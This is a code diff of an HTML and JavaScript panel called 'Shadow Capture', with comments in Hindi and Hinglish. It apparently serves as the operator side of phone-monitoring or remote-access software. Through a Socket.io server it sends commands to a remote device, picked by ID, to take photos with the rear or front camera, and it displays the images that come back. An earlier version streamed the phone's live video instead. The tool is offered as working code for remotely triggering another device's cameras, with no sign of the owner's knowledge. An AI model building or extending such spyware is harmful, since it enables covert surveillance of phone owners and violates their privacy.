@@ -3,131 +3,165 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shadow Live Camera</title>
+    <title>Shadow Photo Capture</title>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        :root { --bg: #0a0a0a; --accent: #00ff88; --panel: #161616; }
-        body { margin: 0; background: var(--bg); color: white; font-family: sans-serif; overflow: hidden; }
+        :root { --bg: #0a0a0a; --accent: #00e5ff; --panel: #161616; --text: #eee; }
+        body { margin: 0; background: var(--bg); color: var(--text); font-family: sans-serif; height: 100vh; display: flex; flex-direction: column; }
         
-        .header { padding: 15px; background: var(--panel); display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
+        /* Header */
+        .header { padding: 15px 20px; background: var(--panel); display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
         .status { display: flex; align-items: center; gap: 8px; font-size: 0.9rem; }
         .dot { height: 10px; width: 10px; background: #ff3333; border-radius: 50%; }
-        .dot.active { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
+        .dot.active { background: #00ff88; box-shadow: 0 0 10px #00ff88; }
 
-        .video-container { 
-            width: 100vw; height: calc(100vh - 70px); 
-            display: flex; justify-content: center; align-items: center; background: #000;
+        /* Main Image Area */
+        .image-container { 
+            flex: 1; display: flex; justify-content: center; align-items: center; 
+            background: #000; position: relative; overflow: hidden;
         }
         
-        /* असली वीडियो प्लेयर */
-        #remoteVideo { 
+        #capturedImage { 
             max-width: 100%; max-height: 100%; 
-            border-radius: 10px; transform: rotate(0deg); /* ज़रूरत पड़ने पर यहाँ से घुमा सकते हो */
+            display: none; border: 2px solid #333; border-radius: 8px;
         }
 
-        .no-video { position: absolute; color: #444; text-align: center; }
-        
+        .placeholder { text-align: center; color: #555; }
+        .loader { display: none; color: var(--accent); }
+
+        /* Controls */
         .controls { 
-            position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%);
-            display: flex; gap: 20px; background: rgba(0,0,0,0.6); padding: 15px 30px;
-            border-radius: 50px; backdrop-filter: blur(10px); border: 1px solid #444;
+            padding: 20px; background: var(--panel); display: flex; justify-content: center; gap: 20px;
+            border-top: 1px solid #333;
         }
-        .btn { color: white; font-size: 1.5rem; cursor: pointer; transition: 0.3s; }
-        .btn:hover { color: var(--accent); scale: 1.2; }
+        
+        .btn { 
+            background: #222; color: white; border: 1px solid #444; 
+            padding: 12px 25px; border-radius: 30px; cursor: pointer; 
+            font-size: 1rem; display: flex; align-items: center; gap: 10px;
+            transition: 0.2s;
+        }
+        .btn:hover { background: #333; border-color: var(--accent); color: var(--accent); }
+        .btn:active { transform: scale(0.95); }
+
     </style>
 </head>
 <body>
 
     <div class="header">
-        <div style="color: var(--accent); font-weight: bold;"><i class="fa-solid fa-ghost"></i> SHADOW CAM</div>
+        <div style="color: var(--accent); font-weight: bold; font-size: 1.2rem;">
+            <i class="fa-solid fa-camera-retro"></i> SHADOW CAPTURE
+        </div>
         <div class="status">
             <span id="stat-dot" class="dot"></span>
-            <span id="stat-text">Connecting Server...</span>
+            <span id="stat-text">Disconnected</span>
         </div>
     </div>
 
-    <div class="video-container">
-        <div id="loader" class="no-video">
-            <i class="fa-solid fa-circle-notch fa-spin fa-3x"></i>
-            <p>Waiting for Phone Stream...</p>
+    <div class="image-container">
+        <div id="placeholder" class="placeholder">
+            <i class="fa-regular fa-image fa-4x"></i>
+            <p>No Image Captured Yet</p>
         </div>
-        <video id="remoteVideo" autoplay playsinline></video>
+
+        <div id="loader" class="loader">
+            <i class="fa-solid fa-circle-notch fa-spin fa-3x"></i>
+            <p>Capturing & Uploading...</p>
+        </div>
+
+        <img id="capturedImage" src="" alt="Captured Photo">
     </div>
 
     <div class="controls">
-        <div class="btn" onclick="location.reload()" title="Refresh"><i class="fa-solid fa-rotate"></i></div>
-        <div class="btn" style="color: #ff3333;" onclick="window.close()" title="Stop"><i class="fa-solid fa-circle-stop"></i></div>
+        <button class="btn" onclick="capturePhoto('camera')">
+            <i class="fa-solid fa-camera"></i> Rear Cam
+        </button>
+        <button class="btn" onclick="capturePhoto('camera_front')">
+            <i class="fa-solid fa-user"></i> Front Cam
+        </button>
     </div>
 
     <script>
+        // 🔥 Server URL (Apna URL check kar lena)
         const SERVER_URL = "https://child-v9no.onrender.com"; 
-        let socket, peerConnection;
+        let socket;
         let deviceId = new URLSearchParams(window.location.search).get('id');
 
-        const config = {
-            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
-        };
+        const imgElement = document.getElementById('capturedImage');
+        const placeholder = document.getElementById('placeholder');
+        const loader = document.getElementById('loader');
+        const statusText = document.getElementById('stat-text');
+        const statusDot = document.getElementById('stat-dot');
 
         if (!deviceId) {
-            document.getElementById('stat-text').innerText = "ERROR: No ID Found";
+            statusText.innerText = "ERROR: Device ID Missing";
         } else {
-            init();
+            initSocket();
         }
 
-        function init() {
+        function initSocket() {
             socket = io(SERVER_URL);
-            
+
+            // Connect Event
             socket.on("connect", () => {
-                document.getElementById('stat-dot').classList.add('active');
-                document.getElementById('stat-text').innerText = "Online: " + deviceId;
-                socket.emit("join", deviceId);
-                console.log("Joined room:", deviceId);
+                statusDot.classList.add('active');
+                statusText.innerText = "Online: " + deviceId;
+                socket.emit("join", deviceId); // Admin room join
+                console.log("Connected to Server");
             });
 
-            // 🔥 PHONE SE OFFER AAYEGA
-            socket.on("offer", async (data) => {
-                console.log("Offer Received from phone");
-                document.getElementById('loader').style.display = 'none';
-                
-                peerConnection = new RTCPeerConnection(config);
-
-                // Jab video track mil jaye
-                peerConnection.ontrack = (event) => {
-                    console.log("Got Track!");
-                    const video = document.getElementById('remoteVideo');
-                    if (video.srcObject !== event.streams[0]) {
-                        video.srcObject = event.streams[0];
-                    }
-                };
-
-                // ICE Candidates bhejna
-                peerConnection.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        socket.emit("candidate", { room: deviceId, candidate: event.candidate });
-                    }
-                };
-
-                await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer || data));
-                const answer = await peerConnection.createAnswer();
-                await peerConnection.setLocalDescription(answer);
-
-                socket.emit("answer", { room: deviceId, answer: answer });
-            });
-
-            // Candidate handle karna
-            socket.on("candidate", async (data) => {
-                try {
-                    if (peerConnection) {
-                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
-                    }
-                } catch (e) { console.error(e); }
-            });
-
+            // Disconnect Event
             socket.on("disconnect", () => {
-                document.getElementById('stat-dot').classList.remove('active');
-                document.getElementById('stat-text').innerText = "Server Disconnected";
+                statusDot.classList.remove('active');
+                statusText.innerText = "Offline";
+            });
+
+            // 🔥 IMAGE RECEIVE EVENT (Jab phone photo bhejega)
+            // Server se event ka naam 'image-received' ya 'file-uploaded' hona chahiye
+            socket.on("image_data", (data) => {
+                console.log("Image Received!");
+                
+                // Hide Loader
+                loader.style.display = 'none';
+                placeholder.style.display = 'none';
+                
+                // Show Image
+                // Agar data base64 hai to: "data:image/jpeg;base64,..."
+                // Agar URL hai to seedha link
+                if(data.startsWith("http") || data.startsWith("data:image")) {
+                    imgElement.src = data;
+                } else {
+                    // Assume Base64 string without prefix
+                    imgElement.src = "data:image/jpeg;base64," + data;
+                }
+                
+                imgElement.style.display = 'block';
+            });
+        }
+
+        // 🔥 COMMAND SENDER
+        function capturePhoto(camType) {
+            if(!socket || !socket.connected) {
+                alert("Server Disconnected!");
+                return;
+            }
+
+            // Loader dikhao
+            imgElement.style.display = 'none';
+            placeholder.style.display = 'none';
+            loader.style.display = 'block';
+
+            // Server ko command bhejo
+            // Format: deviceId, command
+            console.log("Sending command:", camType);
+            
+            // Server par depend karta hai ki wo kaise command expect karta hai.
+            // Zyadatar systems me ye format hota hai:
+            socket.emit("command", {
+                room: deviceId,
+                command: camType
             });
         }
     </script>
